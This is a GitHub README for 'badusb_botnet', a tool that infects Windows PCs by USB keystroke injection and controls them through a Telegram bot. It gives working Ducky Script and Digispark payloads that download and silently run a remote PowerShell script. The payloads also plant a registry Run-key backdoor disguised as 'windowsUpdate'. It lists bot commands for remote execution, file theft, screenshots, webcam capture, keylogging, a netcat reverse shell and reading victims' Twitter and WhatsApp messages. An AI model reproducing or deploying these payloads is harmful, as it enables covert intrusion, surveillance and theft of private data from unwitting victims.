# badusb_botnet
:smiling_imp::busts_in_silhouette: Infect a pc with badusb and establish a connection through telegram.

# Configuration

```powershell
############
## CONFIG ##
############

$BotToken = "<BOTTOKEN>"
$ChatID = '<CHATID>'
$githubScript = '<you_fork/poc.ps1>'
```
>*To create a telegram bot: https://core.telegram.org/bots#6-botfather*

>*To get ChatID: https://stackoverflow.com/questions/32423837/telegram-bot-how-to-get-a-group-chat-id*

## Option 1

```powershell
> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
> (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
> powershell.exe -windowstyle hidden -file poc.ps1
```

```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
DELAY 500
ENTER
STRING (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
DELAY 500
ENTER
STRING powershell.exe -windowstyle hidden -file poc.ps1
DELAY 500
ENTER
```

> Link to convert to .ino: https://malduino.com/converter/

### Digispark

```c
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
DigiKeyboard.sendKeyStroke(0);
DigiKeyboard.delay(500);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(500);
DigiKeyboard.print("powershell");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(750);
DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(500);
DigiKeyboard.print("powershell.exe -windowstyle hidden -file poc.ps1");
DigiKeyboard.sendKeyStroke(KEY_ENTER);
for (;;) {
/*empty*/
    }
}
```

> Get the drivers: https://github.com/digistump/DigistumpArduino/releases

> Additional Board Manager URL: https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json

> DigiKeyboard Source Code: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h



## Option 2 (Backdoor)

```powershell
> reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
> Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
```
```
DELAY 3000
GUI r
DELAY 500
STRING powershell
DELAY 500
ENTER
DELAY 750
STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
DELAY 500
ENTER
STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
DELAY 500
ENTER
STRING reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
DELAY 500
ENTER
```

> Link to convert to .ino: https://malduino.com/converter/

### Telegram Options

#### Basic

- /list (List all devices availables)
- /select ```IP``` ```command``` (Execute a command)
- /stop ```IP``` (Stop remote connection)
- /cleanAll ```IP``` (Clean all files)
- /ipPublic ```IP``` (Geolocate IP)
- /download ```IP``` ```file``` (Download a file from PC)

#### Advanced

- /screenshot ```IP``` (Capture screen)
- /backdoor ```IP``` (Create a persistent backdoor)
- /webcam ```IP```
- /keylogger ```IP``` ```time in seconds```
- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /nc ```IP``` ```IP to connect ($ip)``` (First you must use ```nc -lp 8888 -v``` to create a listener)
- <img src="http://icons-for-free.com/free-icons/png/512/298878.png" width="24px" height="24px" /> /stopnc ```IP``` (Stop nc.exe and erase all archives) 

#### Ultra :squirrel: 

- /hackT ```IP``` (Get Twitter messages if the victim is authenticated) [Only web - W10]
- /hackW ```IP``` (Get WhatsApp messages if the victim is authenticated) [Only Web - W10]
- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" />  /starttwitch ```IP``` ```STREAM_KEY``` (Start a video transmission on Twitch with ffmpeg)
- <img src="https://static-cdn.jtvnw.net/emoticons/v1/112290/1.0" width="24px" height="24px" />  /stoptwitch ```IP``` (Stop ffmpeg.exe and erase all archives) 

### PoCs

:link::tv: [TOUR - POC](https://youtu.be/pFR8B0HNfts "TOUR - POC")

:link::tv: [TWITCH STREAMING - POC](https://youtu.be/3GBIVNhHT0Y "TWITCH STREAMING - POC")

:link::tv: [KEYLOGGER - POC](https://youtu.be/f6JCPnsyGp0 "KEYLOGGER -POC")


##### {TODO}

- Change all Invoke-WebRequest to cURL. (Invoke-WebRequest requires set up Internet Explorer)
- Create an ID for each connected user.
- Hack WhatsApp on .exe.
- :heavy_check_mark: Fix Twitch streaming.
- :heavy_check_mark: Fix keylogger.
- Add monitor selector to screenshot.
- Add windows version detector in HackTwitterW10() and hackWhatsAPPW10() functions.
- Add hackGmail().
- :heavy_check_mark: Verbose via telegram messages.
- :heavy_check_mark: Netcat reverse connection.
